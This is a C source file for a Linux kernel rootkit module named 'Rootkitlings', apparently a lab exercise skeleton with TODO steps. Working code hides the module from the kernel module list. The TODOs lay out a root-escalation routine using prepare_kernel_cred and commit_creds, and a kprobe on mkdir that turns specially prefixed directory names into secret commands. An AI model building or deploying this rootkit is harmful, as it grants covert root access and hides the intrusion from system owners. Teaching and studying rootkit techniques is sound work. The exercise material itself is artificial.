// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/ptrace.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#define RK_PREFIX "rkling."
#define RK_PREFIX_LEN 7
#define RK_PATH_MAX 128

static struct list_head *saved_prev;
static bool cloaked;
static struct proc_dir_entry *proc_entry;

static void rk_module_cloak(void)
{
	if (cloaked)
		return;
	saved_prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	cloaked = true;
}

static void rk_module_uncloak(void)
{
	if (!cloaked)
		return;
	list_add(&THIS_MODULE->list, saved_prev);
	cloaked = false;
}

// TODO: Implement rk_escalate()
// Allocate new root credentials with prepare_kernel_cred(NULL)
// Apply them with commit_creds()
// Return 0 on success, -ENOMEM if allocation fails

// TODO: Implement rk_parse_local_command(path)
// path points past the initial prefix check
// Match the command after "rkling.":
//   "e"   -> rk_escalate()
//   "h.m" -> rk_module_cloak()
//   "u.m" -> rk_module_uncloak()
//   anything else -> return -ENOENT

// TODO: Implement rk_mkdir_pre(probe, regs)
// Hook target is __x64_sys_mkdir(const struct pt_regs *uregs)
// 1. Get inner pt_regs from argument 0, read pathname from uregs->di
// 2. Copy the user path string with strncpy_from_user
// 3. Check for "rkling." prefix, return 0 if not ours
// 4. Call rk_parse_local_command with the path
// 5. Set return value and call override_function_with_return
// 6. Return 1 to skip the real mkdir

static struct kprobe mkdir_probe = {
	.symbol_name = "__x64_sys_mkdir",
	// TODO: set .pre_handler
};

static int rk_show(struct seq_file *out, void *unused)
{
	(void)unused;
	seq_printf(out, "module: %s\n", cloaked ? "hidden" : "visible");
	return 0;
}

static int rk_proc_open(struct inode *inode, struct file *file)
{
	return single_open(file, rk_show, NULL);
}

static const struct proc_ops rk_proc_ops = {
	.proc_open = rk_proc_open,
	.proc_read = seq_read,
	.proc_lseek = seq_lseek,
	.proc_release = single_release,
};

// TODO: Implement rk_init()
// 1. Register mkdir kprobe
// 2. Create /proc/rkling_status (0400)
// Clean up on failure

// TODO: Implement rk_exit()
// 1. Uncloak module
// 2. Remove proc entry
// 3. Unregister kprobe

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rootkitlings local covert control");
